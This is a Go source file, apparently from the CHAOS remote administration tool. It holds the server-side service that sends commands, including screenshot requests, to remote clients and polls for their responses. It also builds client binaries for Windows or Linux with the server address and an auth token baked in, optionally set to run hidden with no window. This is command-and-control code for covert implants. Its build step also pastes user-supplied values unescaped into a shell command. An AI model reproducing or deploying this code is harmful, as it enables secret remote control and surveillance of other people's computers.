package services

import (
	"context"
	"fmt"
	"github.com/google/uuid"
	repo "github.com/tiagorlampert/CHAOS/repositories"
	"github.com/tiagorlampert/CHAOS/shared/utils"
	"github.com/tiagorlampert/CHAOS/shared/utils/constants"
	"github.com/tiagorlampert/CHAOS/shared/utils/image"
	"github.com/tiagorlampert/CHAOS/shared/utils/jwt"
	"github.com/tiagorlampert/CHAOS/shared/utils/system"
	"os/exec"
	"strings"
	"time"
)

const secretKeySize = 50

type clientService struct {
	appVersion     string
	repository     repo.Auth
	payloadService Payload
	authService    Auth
}

func NewClient(
	appVersion string,
	repository repo.Auth,
	payloadCache Payload,
	authService Auth) Client {
	return &clientService{
		repository:     repository,
		payloadService: payloadCache,
		appVersion:     appVersion,
		authService:    authService,
	}
}

func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
	addr, err := utils.DecodeBase64(input.MacAddress)
	if err != nil {
		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
	}

	c.payloadService.Set(addr, &PayloadData{
		Request: input.Request,
	})
	defer c.payloadService.Remove(addr)

	var payload *PayloadData
	var done bool
	for !done {
		time.Sleep(2 * time.Second)
		res, _ := c.payloadService.Get(addr)
		res.Request = input.Request
		if res.HasResponse {
			payload, _ = HandleResponse(res)
			done = true
		}
	}

	res := utils.ByteToString(payload.Response)
	if payload.HasError {
		return SendCommandOutput{}, fmt.Errorf(res)
	}
	if len(strings.TrimSpace(res)) == 0 {
		return SendCommandOutput{Response: constants.NoContent}, nil
	}
	return SendCommandOutput{Response: res}, nil
}

func HandleResponse(payload *PayloadData) (*PayloadData, error) {
	switch payload.Request {
	case "screenshot":
		file, err := image.WritePNG(payload.Response)
		if err != nil {
			return nil, err
		}
		payload.Response = utils.StringToByte(file)
		break
	default:
		return payload, nil
	}
	return payload, nil
}

func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
	token, err := c.generateNewToken()
	if err != nil {
		return "", err
	}

	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
	filename := handleFilename(input.OSTarget, input.Filename)
	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.appVersion, input.ServerPort, input.ServerAddress, token, filename)
	cmd := exec.Command("sh", "-c", buildCmd)
	cmd.Dir = "client/"

	err = cmd.Run()
	if err != nil {
		return "", err
	}
	return filename, nil
}

func (c clientService) generateNewToken() (string, error) {
	auth, err := c.authService.First()
	if err != nil {
		return "", err
	}
	return jwt.NewToken(auth.SecretKey, jwt.IdentityDefaultUser)
}

func handleOSType(osType system.OSType) string {
	switch osType {
	case system.Windows:
		return "windows"
	case system.Linux:
		return "linux"
	//case 3:
	//	return "darwin"
	default:
		return "unknown"
	}
}

func runHidden(hidden bool) string {
	if hidden {
		return "-H=windowsgui"
	}
	return ""
}

func handleFilename(osType system.OSType, filename string) string {
	if len(strings.TrimSpace(filename)) <= 0 {
		filename = uuid.New().String()
	}
	switch osType {
	case system.Windows:
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}
